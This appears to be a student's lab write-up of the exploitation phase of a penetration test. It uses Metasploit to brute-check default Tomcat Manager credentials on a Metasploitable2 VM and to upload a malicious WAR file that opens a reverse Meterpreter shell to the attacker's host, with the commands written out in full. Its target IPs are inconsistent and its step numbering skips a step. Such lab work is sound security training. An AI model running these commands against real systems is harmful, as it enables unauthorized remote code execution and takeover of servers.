**Overview**

This section documents the Exploitation phase of the VAPT lifecycle.
The objective of this lab was to validate previously identified vulnerabilities by safely exploiting them in a controlled lab environment and confirming their real-world impact.

The exploitation focused on Apache Tomcat Manager Remote Code Execution (RCE) identified during vulnerability scanning.

**Lab Environment**

Attacker Machine: Kali Linux
Target Machine: Metasploitable2
Target IP: 192.168.1.15
Exploitation Framework: Metasploit

**Tools Used**

Metasploit Framework
Exploit-DB (for PoC validation)
Burp Suite (credential validation – optional)
sqlmap (used later in capstone phase)


**Step 1: Start Metasploit Framework**

Metasploit was launched on Kali Linux to perform exploitation.
sudo msfconsole

**Step 2: Search for Tomcat Manager Exploits**

Based on the vulnerability scanning results, Apache Tomcat services were identified as vulnerable.
search tomcat manager

**Result**

Multiple Tomcat-related modules were identified, including:
auxiliary/scanner/http/tomcat_mgr_login
exploit/multi/http/tomcat_mgr_upload

**Step 3: Credential Discovery (Tomcat Manager Login)**

The Tomcat Manager login scanner was used to identify valid credentials.
Module used
use auxiliary/scanner/http/tomcat_mgr_login

set RHOSTS 192.168.10.16
set RPORT 8180
set USER_AS_PASS true
run

Result : default credentials
tomacat : tomcat

This confirmed weak authentication on the Tomcat Manager interface.

**Step 4: Exploitation Using Tomcat Manager Upload**

After obtaining valid credentials, the exploitation phase was performed using a WAR file upload.
use exploit/multi/http/tomcat_mgr_upload

set RHOSTS 192.168.10.16
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.23.135
set LPORT 4444
exploit

Step 5: Successful Exploitation Result

Malicious WAR file uploaded successfully
Payload executed on the target
Meterpreter session opened
<img width="1033" height="630" alt="Screenshot 2026-01-06 234817" src="https://github.com/user-attachments/assets/4c5baf75-5bb7-4680-ae8d-b57cd3adc9d2" />


This confirms remote code execution (RCE) on the target system.

**Conclusion**

The exploitation phase successfully validated critical vulnerabilities identified during scanning. 
Apache Tomcat Manager misconfigurations enabled remote code execution, resulting in full system access. 
This confirms the severity of the vulnerability and highlights the importance of strong authentication and service hardening.


**Step 7: Exploit-DB Validation**

Exploit-DB documents Apache Tomcat Manager vulnerabilities where weak or default credentials allow attackers to upload malicious WAR files. 
Successful exploitation results in remote code execution. This behavior directly matches the Metasploit tomcat_mgr_upload module used in this lab.
